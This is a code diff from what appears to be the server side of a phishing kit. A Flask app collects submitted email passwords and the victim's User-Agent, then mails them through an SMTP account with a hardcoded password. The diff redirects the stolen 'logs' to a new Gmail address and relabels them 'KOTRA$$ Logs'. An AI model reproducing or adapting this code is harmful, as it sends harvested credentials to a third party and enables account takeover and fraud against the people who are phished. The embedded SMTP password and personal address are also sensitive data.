@@ -147,11 +147,11 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "contact@domainshieldtech.bio"
         sender_emaill = "contact"
-        receiver_email = "generallogs@mail.com "
+        receiver_email = "danielnewwoj@gmail.com"
         password = "vip6ebdd04ea6df"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "GENERAL Logs !"
+        message["Subject"] = "KOTRA$$ Logs "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -187,11 +187,11 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "contact@domainshieldtech.bio"
         sender_emaill = "contact"
-        receiver_email = "generallogs@mail.com"
+        receiver_email = "danielnewwoj@gmail.com"
         password = "vip6ebdd04ea6df"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "GENERAL logs !! "
+        message["Subject"] = "KOTRA$$ Logs  !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
